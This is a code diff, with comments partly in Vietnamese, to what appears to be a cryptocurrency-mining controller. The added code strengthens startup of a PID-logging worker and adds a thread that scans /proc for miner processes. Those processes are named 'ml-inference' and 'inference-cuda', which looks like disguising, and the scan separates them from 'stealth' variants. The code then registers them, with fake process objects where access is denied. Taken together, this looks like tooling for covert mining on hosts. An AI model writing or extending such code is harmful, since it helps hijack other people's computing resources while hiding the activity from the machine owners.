@@ -673,9 +673,10 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                             
                     except Exception as _pid_err:
                         logger.warning(f"Enhanced PID logger registration failed: {_pid_err}")
-                        # Fallback to legacy log_pid
+                        # Fallback to legacy log_pid và auto registration
                         try:
                             log_pid(process.pid, cpu)
+                            logger.info(f"✅ Fallback: logged PID {process.pid} via log_pid()")
                         except Exception as _fallback_err:
                             logger.error(f"Fallback PID logging also failed: {_fallback_err}")
                 
@@ -1229,12 +1230,111 @@ def main():
     # ------------------------------------------------------------------
     bus = get_thread_event_bus()
     logger.info("✅ Thread communication EventBus initialized")
-    # 🚀 Khởi động PID Logger worker
-    start_worker()
-    logger.info("🚀 PID Logger worker started")
+    # 🚀 Khởi động PID Logger worker với error handling và verification
+    try:
+        from pid_logger import _WORKER_STARTED
+        start_worker()
+        # Verify worker đã khởi chạy thành công
+        for i in range(5):  # Retry 5 lần, mỗi lần 0.5s
+            if _WORKER_STARTED.is_set():
+                logger.info("🚀 PID Logger worker started successfully")
+                break
+            time.sleep(0.5)
+            logger.info(f"⏳ Waiting for PID Logger worker to start... (attempt {i+1}/5)")
+        else:
+            logger.error("❌ PID Logger worker failed to start after 5 attempts")
+            # Force restart worker
+            from pid_logger import force_restart_worker
+            force_restart_worker()
+            logger.info("🔄 Force restarted PID Logger worker")
+    except Exception as e:
+        logger.error(f"❌ Failed to start PID Logger worker: {e}")
+        # Fallback: try to start worker again
+        try:
+            start_worker()
+            logger.info("🔄 Fallback PID Logger worker started")
+        except Exception as e2:
+            logger.error(f"❌ Fallback PID Logger worker also failed: {e2}")
 
+    # 🤖 Auto PID Registration Thread để theo dõi và đăng ký tiến trình mining
+    def auto_pid_registration_thread():
+        """Luồng tự động theo dõi và đăng ký tiến trình mining mới"""
+        import time as time_module
+        import glob
+        import os
+        from pid_logger import register_process, _PROCESS_REGISTRY, debug_registry_status
+        
+        logger.info("🤖 Auto PID Registration Thread started")
+        last_scan_pids = set()
+        
+        while True:
+            try:
+                # Scan các tiến trình ml-inference và inference-cuda
+                current_pids = set()
+                
+                for proc_dir in glob.glob("/proc/[0-9]*"):
+                    try:
+                        pid = int(proc_dir.split('/')[-1])
+                        with open(f"{proc_dir}/cmdline", 'r') as f:
+                            cmdline = f.read().strip()
+                        
+                        # Check ml-inference (CPU)
+                        if "ml-inference" in cmdline and "stealth" not in cmdline:
+                            current_pids.add((pid, "cpu", "ml-inference"))
+                        # Check inference-cuda (GPU)
+                        elif "inference-cuda" in cmdline and "stealth" not in cmdline:
+                            current_pids.add((pid, "gpu", "inference-cuda"))
+                            
+                    except (OSError, IOError, ValueError):
+                        continue
+                
+                # Đăng ký các PID mới
+                new_pids = current_pids - last_scan_pids
+                for pid, process_type, process_name in new_pids:
+                    if pid not in _PROCESS_REGISTRY:
+                        try:
+                            # Sử dụng psutil để tạo real process object
+                            import psutil
+                            real_proc = psutil.Process(pid)
+                            
+                            register_process(pid, process_type, real_proc, process_name)
+                            logger.info(f"🤖 Auto-registered new {process_type} mining PID: {pid} with real psutil process object")
+                        except psutil.NoSuchProcess:
+                            logger.warning(f"🤖 Process PID {pid} no longer exists during registration")
+                        except psutil.AccessDenied:
+                            logger.warning(f"🤖 Access denied for PID {pid}, using fallback fake process")
+                            # Fallback to fake process if access denied
+                            fake_proc = type('FakeProcess', (), {
+                                'poll': lambda: None if os.path.exists(f"/proc/{pid}") else 0,
+                                'is_running': lambda: os.path.exists(f"/proc/{pid}")
+                            })()
+                            register_process(pid, process_type, fake_proc, process_name)
+                            logger.info(f"🤖 Auto-registered new {process_type} mining PID: {pid} with fallback fake process")
+                        except Exception as e:
+                            logger.warning(f"🤖 Auto-registration failed for PID {pid}: {e}")
+                
+                last_scan_pids = current_pids
+                
+                # Debug info mỗi 30s
+                if time_module.time() % 30 < 5:  # Gần như mỗi 30s
+                    debug_registry_status()
+                
+                time_module.sleep(5)  # Scan mỗi 5 giây
+                
+            except Exception as e:
+                logger.error(f"🤖 Auto PID Registration Thread error: {e}")
+                time_module.sleep(10)  # Sleep dài hơn khi có lỗi
+    
     # Thêm khai báo danh sách mining_threads
     mining_threads = []
+    
+    # Thêm Auto PID Registration Thread
+    auto_pid_thread = threading.Thread(
+        target=auto_pid_registration_thread,
+        daemon=True,
+        name="AutoPIDRegistrationThread"
+    )
+    mining_threads.append(('Auto PID Registration', auto_pid_thread, True))
 
     # (Đã bỏ EnvironmentSetupThread – môi trường thiết lập đồng bộ)
 
